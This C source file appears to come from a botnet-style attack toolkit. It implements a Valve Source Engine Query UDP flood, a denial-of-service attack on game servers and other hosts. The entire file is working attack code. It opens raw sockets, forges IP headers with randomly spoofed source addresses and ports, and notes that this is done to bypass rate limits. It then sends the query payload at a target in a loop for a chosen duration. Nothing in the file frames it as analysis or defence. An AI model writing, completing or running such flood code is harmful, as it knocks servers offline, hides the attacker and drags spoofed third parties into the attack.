#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>

#include "attack.h"

// Valve Source Engine Query Flood (TSource Engine Query)
// Payload: 0xFF 0xFF 0xFF 0xFF 0x54 0x53 0x6f 0x75 0x72 0x63 0x65 0x20 0x45 0x6e 0x67 0x69 0x6e 0x65 0x20 0x51 0x75 0x65 0x72 0x79 0x00
static const uint8_t vse_payload[] = {
    0xFF, 0xFF, 0xFF, 0xFF, 
    0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00
};

void attack_udp_vse(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return;

    const int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = ip;

    char packet[1024];
    struct ip *iph = (struct ip *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));

    // Pre-fill Headers
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(vse_payload);
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_UDP;
    iph->ip_src.s_addr = fast_rand(); // Random Spoof
    iph->ip_dst.s_addr = ip;

    udph->uh_dport = htons(port);
    udph->uh_ulen = htons(sizeof(struct udphdr) + sizeof(vse_payload));
    udph->uh_sum = 0;

    // Copy Payload once (static)
    uint8_t *data = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct udphdr));
    memcpy(data, vse_payload, sizeof(vse_payload));

    time_t end_time = time(NULL) + duration;

    while (time(NULL) < end_time) {
        // Rotate Source IP/Port to bypass rate limits
        iph->ip_src.s_addr = fast_rand();
        iph->ip_id = htonl(fast_rand() & 0xFFFF);
        
        // VSE specific: Often targets game servers on specific ports
        // but can be used as generic UDP amp payload against servers running Source.
        udph->uh_sport = htons(fast_rand() & 0xFFFF);
        
        // Re-calc IP Checksum? Linux Raw sockets usually handle IP csum if 0, 
        // but we're changing src IP.
        iph->ip_sum = 0;
        iph->ip_sum = csum((unsigned short *)packet, sizeof(struct ip));

        sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }
    close(sock);
}
